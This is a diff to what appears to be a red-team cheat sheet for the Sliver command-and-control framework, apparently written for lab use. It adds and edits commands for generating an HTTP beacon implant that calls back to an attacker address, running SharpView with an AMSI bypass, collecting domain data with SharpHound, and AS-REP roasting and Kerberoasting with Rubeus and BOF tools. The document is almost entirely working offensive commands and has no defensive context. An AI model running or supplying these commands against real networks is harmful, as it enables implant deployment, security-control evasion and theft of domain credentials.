@@ -21,7 +21,7 @@ http -L 10.0.0.1 -l 8088
 jobs
 
 ## implant beacon
-generate beacon --http 10.10.14.62:8088 -N mybe.exe
+generate beacon --http 10.10.15.144:8088 -N mybe
 ### beacon tasks
 tasks
 ### go session
@@ -59,14 +59,21 @@ c2tc-domaininfo
 sharpview -- Get-Domain
 sharpview --in-process --amsi-bypass -- Get-Domain
 
-# ASROP
+#bloodhound
+sharp-hound-4 -- -c All -d my.local --domainController 172.16.1.15 --zipfilename myhound
+
+# ASREP
 rubeus -- asreproast /format:hashcat /nowrap
 # kerberoast
 ## enum
 delegationbof 6 child.my.local
 ## attack
+### BOF
+#### https://github.com/outflanknl/C2-Tool-Collection/blob/e371a38c717edaf1650923575ab33bee0dd3e0ee/BOF/Kerberoast/TicketToHashcat.py
 c2tc-kerberoast roast alice
+### Rubeus
 rubeus -- kerberoast /format:hashcat /nowrap
+inline-execute-assembly /usr/share/windows-binaries/Ghostpack-CompiledBinaries/Rubeus.exe 'kerberoast /user:testuser /format:hashcat /nowrap'
 
 # ADCS
 certify -- find 
